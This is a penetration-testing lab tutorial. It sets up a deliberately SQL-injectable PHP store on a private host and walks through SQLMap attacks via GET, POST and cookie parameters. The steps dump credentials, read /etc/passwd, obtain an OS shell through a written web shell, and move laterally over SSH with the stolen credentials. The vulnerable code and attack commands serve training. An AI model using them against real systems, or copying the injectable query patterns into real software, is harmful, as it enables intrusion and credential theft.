# CPTS Lab: SQLMap Practical — From Capture to Shell

## Objective

Practice the full SQLMap workflow that the CPTS exam expects: identify an injectable parameter, capture the request, feed it to SQLMap, extract data, read files, and attempt OS command execution. Every flag and step is explained.

---

## Setup (Debian — 192.168.244.132)

```bash
sudo apt update && sudo apt install apache2 php libapache2-mod-php php-mysql mariadb-server -y
sudo systemctl enable --now apache2 mariadb

sudo mysql << 'SQL'
CREATE DATABASE store;
CREATE TABLE store.products (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(50), price DECIMAL(10,2), category VARCHAR(30));
INSERT INTO store.products VALUES (1,'Laptop',999.99,'Electronics'),(2,'Keyboard',49.99,'Electronics'),(3,'Desk',299.99,'Furniture'),(4,'Monitor',349.99,'Electronics');

CREATE TABLE store.customers (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(50), password VARCHAR(100), email VARCHAR(100), is_admin TINYINT);
INSERT INTO store.customers VALUES (1,'admin','Adm1nSt0re!','admin@store.local',1);
INSERT INTO store.customers VALUES (2,'john','JohnP@ss1','john@store.local',0);
INSERT INTO store.customers VALUES (3,'sarah','S@rahShop2026','sarah@store.local',0);
INSERT INTO store.customers VALUES (4,'svc_deploy','D3pl0y_Cr3d!','deploy@store.local',1);

CREATE TABLE store.config (id INT AUTO_INCREMENT PRIMARY KEY, setting VARCHAR(50), value VARCHAR(200));
INSERT INTO store.config VALUES (1,'ssh_host','192.168.244.131');
INSERT INTO store.config VALUES (2,'ssh_user','deployer');
INSERT INTO store.config VALUES (3,'ssh_pass','D3pl0y_Cr3d!');
INSERT INTO store.config VALUES (4,'flag','FLAG{sqlmap_full_extraction}');

GRANT ALL ON store.* TO 'storeuser'@'localhost' IDENTIFIED BY 'storedbpass';
GRANT FILE ON *.* TO 'storeuser'@'localhost';
FLUSH PRIVILEGES;
SQL

# Product search (GET — injectable)
cat << 'PHPEOF' | sudo tee /var/www/html/products.php
<?php
mysqli_report(MYSQLI_REPORT_OFF);
$conn = new mysqli("localhost","storeuser","storedbpass","store");
$output = "";
if(isset($_GET['cat'])) {
    $cat = $_GET['cat'];
    $r = $conn->query("SELECT id, name, price FROM products WHERE category='$cat'");
    if($r && $r->num_rows > 0) {
        $output = "<table border='1' cellpadding='8'><tr><th>ID</th><th>Product</th><th>Price</th></tr>";
        while($row = $r->fetch_assoc()) {
            $output .= "<tr><td>{$row['id']}</td><td>{$row['name']}</td><td>\${$row['price']}</td></tr>";
        }
        $output .= "</table>";
    } else { $output = "<p>No products in this category.</p>"; }
}
?>
<html><body>
<h1>Product Catalog</h1>
<p>Categories: <a href="?cat=Electronics">Electronics</a> | <a href="?cat=Furniture">Furniture</a></p>
<?php echo $output; ?>
</body></html>
PHPEOF

# Login form (POST — injectable)
cat << 'PHPEOF' | sudo tee /var/www/html/login.php
<?php
mysqli_report(MYSQLI_REPORT_OFF);
$conn = new mysqli("localhost","storeuser","storedbpass","store");
$msg = "";
if(isset($_POST['username']) && isset($_POST['password'])) {
    $u = $_POST['username'];
    $p = $_POST['password'];
    $r = $conn->query("SELECT * FROM customers WHERE username='$u' AND password='$p'");
    if($r && $row = $r->fetch_assoc()) {
        $msg = "<p style='color:green'>Welcome, {$row['username']}! Admin: " . ($row['is_admin'] ? 'Yes' : 'No') . "</p>";
    } else {
        $msg = "<p style='color:red'>Invalid credentials.</p>";
    }
}
?>
<html><body>
<h1>Customer Login</h1>
<form method="POST">
Username: <input name="username" size="30"><br><br>
Password: <input type="password" name="password" size="30"><br><br>
<button type="submit">Login</button>
</form>
<?php echo $msg; ?>
</body></html>
PHPEOF

# Cookie-based injection
cat << 'PHPEOF' | sudo tee /var/www/html/dashboard.php
<?php
mysqli_report(MYSQLI_REPORT_OFF);
$conn = new mysqli("localhost","storeuser","storedbpass","store");
$user_id = $_COOKIE['user_id'] ?? '1';
$r = $conn->query("SELECT username, email FROM customers WHERE id=$user_id");
$row = $r ? $r->fetch_assoc() : null;
?>
<html><body>
<h1>Dashboard</h1>
<?php if($row): ?>
<p>User: <?= $row['username'] ?></p>
<p>Email: <?= $row['email'] ?></p>
<?php else: ?>
<p>User not found.</p>
<?php endif; ?>
<p><small>Set cookie 'user_id' to change user context.</small></p>
</body></html>
PHPEOF

# Create a sensitive file readable via SQLi LOAD_FILE
echo "INTERNAL_API_KEY=sk_live_FLAG{file_read_via_sqlmap}" | sudo tee /var/www/html/internal_config.txt
sudo chmod 644 /var/www/html/internal_config.txt

echo '<h1>Store</h1><p><a href="products.php?cat=Electronics">Products</a> | <a href="login.php">Login</a> | <a href="dashboard.php">Dashboard</a></p>' | sudo tee /var/www/html/index.html

sudo iptables -F && sudo iptables -P INPUT ACCEPT
```

---

## Exercise 1: GET Parameter — From Manual to SQLMap

### Step 1: Confirm injection manually

```bash
# Normal request
curl 'http://192.168.244.132/products.php?cat=Electronics'
# Shows products table

# Inject a single quote
curl 'http://192.168.244.132/products.php?cat=Electronics%27'
# Response changes (error or empty) — confirms injection
```

### Step 2: Save the request for SQLMap

**Method A: Build the URL manually**

```bash
sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch
```

**Method B: Capture in Burp (more reliable for complex apps)**

```bash
# In Burp, browse to: http://192.168.244.132/products.php?cat=Electronics
# Right-click the request in HTTP history → Copy to file → save as get_request.txt

# The saved file looks like:
# GET /products.php?cat=Electronics HTTP/1.1
# Host: 192.168.244.132
# User-Agent: Mozilla/5.0...
# Accept: text/html...
# Connection: close

# Feed it to SQLMap
sqlmap -r get_request.txt --batch
```

### Step 3: Let SQLMap identify the injection

```bash
sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch
```

**What SQLMap reports:**

```
[INFO] the back-end DBMS is MySQL
[INFO] GET parameter 'cat' is vulnerable. Do you want to keep testing the others? [y/N]
Parameter: cat (GET)
    Type: boolean-based blind
    Type: error-based
    Type: time-based blind
    Type: UNION query

back-end DBMS: MySQL >= 5.0
```

**Reading this output:**
- SQLMap found 4 injection types on the `cat` parameter
- The database is MySQL 5.0+
- UNION query is the fastest for extraction — SQLMap will use it

### Step 4: Extract databases

```bash
sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch --dbs
```

**Output:**

```
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] store
```

### Step 5: Extract tables from the store database

```bash
sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch -D store --tables
```

**Output:**

```
Database: store
[3 tables]
+-----------+
| config    |
| customers |
| products  |
+-----------+
```

### Step 6: Dump credentials

```bash
# Dump the customers table (usernames + passwords)
sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch -D store -T customers --dump

# Dump only specific columns (faster)
sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch -D store -T customers -C username,password,is_admin --dump
```

**Output:**

```
+----------+----------------+----------+
| username | password       | is_admin |
+----------+----------------+----------+
| admin    | Adm1nSt0re!    | 1        |
| john     | JohnP@ss1      | 0        |
| sarah    | S@rahShop2026  | 0        |
| svc_deploy| D3pl0y_Cr3d!  | 1        |
+----------+----------------+----------+
```

### Step 7: Dump the config table (secrets)

```bash
sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch -D store -T config --dump
```

**Output reveals SSH credentials and the flag.**

### Step 8: Read files from the server

```bash
sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch --file-read="/etc/passwd"
# SQLMap saves the file locally and tells you the path

sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch --file-read="/var/www/html/internal_config.txt"
# Contains: INTERNAL_API_KEY=sk_live_FLAG{file_read_via_sqlmap}

sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch --file-read="/var/www/html/login.php"
# Reads the PHP source code — see how the login query is built
```

### Step 9: Attempt OS shell

```bash
sqlmap -u "http://192.168.244.132/products.php?cat=Electronics" --batch --os-shell
```

**What SQLMap does:** Tries to write a PHP web shell to the web root using `SELECT INTO OUTFILE`, then uses it for command execution. This requires the MySQL user to have FILE privileges and the web root to be writable.

If it works, you get an interactive shell:

```
os-shell> whoami
www-data
os-shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Exercise 2: POST Parameter

### Step 1: Capture the login request

```bash
# Send a test login and save the request
# Method A: Create the request file manually
cat << 'EOF' > post_request.txt
POST /login.php HTTP/1.1
Host: 192.168.244.132
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

username=admin&password=testpass
EOF
```

### Step 2: Run SQLMap against the POST request

```bash
sqlmap -r post_request.txt --batch
```

SQLMap tests BOTH `username` and `password` parameters. It finds injection in both.

```bash
# Test only the username parameter
sqlmap -r post_request.txt --batch -p username

# Extract data through the POST injection
sqlmap -r post_request.txt --batch -p username --dbs
sqlmap -r post_request.txt --batch -p username -D store -T customers --dump
```

---

## Exercise 3: Cookie-Based Injection

### Step 1: Identify the injectable cookie

```bash
curl http://192.168.244.132/dashboard.php -b "user_id=1"
# Shows user 1's info

curl http://192.168.244.132/dashboard.php -b "user_id=1'"
# Error or different response — injection in cookie
```

### Step 2: SQLMap with cookie injection

```bash
# Tell SQLMap to test cookies (requires --level=2 or higher)
sqlmap -u "http://192.168.244.132/dashboard.php" --cookie="user_id=1" --level=2 --batch
```

**Why `--level=2` is needed:** At default level (1), SQLMap only tests GET and POST parameters. Level 2 adds cookie testing. Level 3 adds User-Agent and Referer headers.

```bash
# Extract through the cookie injection
sqlmap -u "http://192.168.244.132/dashboard.php" --cookie="user_id=1" --level=2 --batch -D store -T config --dump
```

---

## Exercise 4: Combine SQLMap with Other Attacks

### The CPTS workflow

```bash
# 1. SQLMap extracts credentials
sqlmap -r post_request.txt --batch -D store -T customers -C username,password --dump
# Found: svc_deploy / D3pl0y_Cr3d!

# 2. SQLMap extracts config
sqlmap -r post_request.txt --batch -D store -T config --dump
# Found: SSH host 192.168.244.131, user deployer, pass D3pl0y_Cr3d!

# 3. Test found credentials on other services
crackmapexec ssh 192.168.244.131 -u deployer -p 'D3pl0y_Cr3d!'
crackmapexec ssh 192.168.244.132 -u svc_deploy -p 'D3pl0y_Cr3d!'

# 4. SSH with found credentials
ssh deployer@192.168.244.131
# D3pl0y_Cr3d!

# SQLi → credential extraction → lateral movement
# This is the CPTS chain in action
```

---

## SQLMap Flags You Used (and why)

```
-u URL                Target URL with parameter
-r file.txt           Read full request from Burp-saved file
--batch               Auto-answer all prompts (don't ask questions)
-p param              Test only this specific parameter
--dbs                 List all databases
-D name --tables      List tables in a database
-T name --columns     List columns in a table
-C col1,col2 --dump   Dump specific columns
--dump                Dump the table
--file-read=path      Read a file from the server's filesystem
--os-shell            Attempt interactive OS shell
--cookie="..."        Set a cookie value
--level=2             Test cookies (1=GET/POST, 2=+cookies, 3=+headers)
--dbms=mysql          Specify database type (faster — skip testing others)
--threads=10          Parallel threads (faster extraction)
```

---

## Cleanup

```bash
sudo mysql -e "DROP DATABASE store; DROP USER 'storeuser'@'localhost';"
sudo rm -f /var/www/html/{products,login,dashboard,index}.php /var/www/html/internal_config.txt
```
